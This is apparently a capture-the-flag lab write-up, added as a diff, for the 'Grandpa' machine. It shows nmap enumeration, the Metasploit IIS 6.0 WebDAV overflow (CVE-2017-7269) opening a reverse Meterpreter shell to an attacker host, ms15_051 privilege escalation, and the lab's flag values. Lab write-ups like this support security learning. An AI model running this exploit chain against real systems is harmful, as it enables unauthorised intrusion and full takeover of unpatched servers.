@@ -1,0 +1,79 @@
+Grandpa
+
+Enumeration: 
+sudo nmap -sC -sV -p- --min-rate=1000 10.129.95.233
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Microsoft IIS httpd 6.0
+|_http-title: Under Construction
+| http-webdav-scan: 
+|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
+|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
+|   WebDAV type: Unknown
+|   Server Date: Sun, 21 Jul 2024 02:31:16 GMT
+|_  Server Type: Microsoft-IIS/6.0
+| http-methods: 
+|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
+|_http-server-header: Microsoft-IIS/6.0
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+gobuster dir -u http://10.129.95.233/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+
+[msf](Jobs:0 Agents:0) >> search iis 6.0
+
+Matching Modules
+================
+
+   #  Name                                                 Disclosure Date  Rank    Check  Description
+   -  ----                                                 ---------------  ----    -----  -----------
+   0  exploit/windows/firewall/blackice_pam_icq            2004-03-18       great   No     ISS PAM.dll ICQ Parser Buffer Overflow
+   1  auxiliary/dos/windows/http/ms10_065_ii6_asp_dos      2010-09-14       normal  No     Microsoft IIS 6.0 ASP Stack Exhaustion Denial of Service
+   2  exploit/windows/iis/iis_webdav_scstoragepathfromurl  2017-03-26       manual  Yes    Microsoft IIS WebDav ScStoragePathFromUrl Overflow
+
+Let’s try some of the exploits
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7269 
+
+     Name: Microsoft IIS WebDav ScStoragePathFromUrl Overflow
+     Module: exploit/windows/iis/iis_webdav_scstoragepathfromurl
+
+Description:
+  Buffer overflow in the ScStoragePathFromUrl function
+  in the WebDAV service in Internet Information Services (IIS) 6.0
+  in Microsoft Windows Server 2003 R2 allows remote attackers to
+  execute arbitrary code via a long header beginning with
+  "If: <http://" in a PROPFIND request, as exploited in the
+  wild in July or August 2016.
+
+
+[msf](Jobs:0 Agents:0) exploit(windows/iis/iis_webdav_scstoragepathfromurl) >> run
+
+[*] Started reverse TCP handler on 10.10.14.30:4444 
+[*] Trying path length 3 to 60 ...
+[*] Sending stage (175686 bytes) to 10.129.95.233
+[*] Meterpreter session 1 opened (10.10.14.30:4444 -> 10.129.95.233:1030) at 2024-07-20 21:40:20 -0500
+
+
+I’m going to use metasploit local_exploit_suggester in post/multi/recon on the meterpreter session
+
+-----------  ------------
+ 1   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.
+ 2   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
+ 3   exploit/windows/local/ms14_070_tcpip_ioctl                     Yes                      The target appears to be vulnerable.
+ 4   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
+ 5   exploit/windows/local/ms16_016_webdav                          Yes                      The service is running, but could not be validated.
+ 6   exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.
+
+Let’s go down the list and see what we can do.
+
+exploit/windows/local/ms15_051_client_copy_image was able to get us in after migrating our PID to one with higher permissions. 
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1701 
+
+
+(Meterpreter 4)(c:\Documents and Settings\Administrator\Desktop) > cat root.txt
+9359e905a2c35f861f6a57cecf28bb7b(
+
+(Meterpreter 4)(c:\Documents and Settings\Harry\Desktop) > cat user.txt 
+bdff5ec67c3cff017f2bedc146a5d869(
+
+
+Now we have root access:
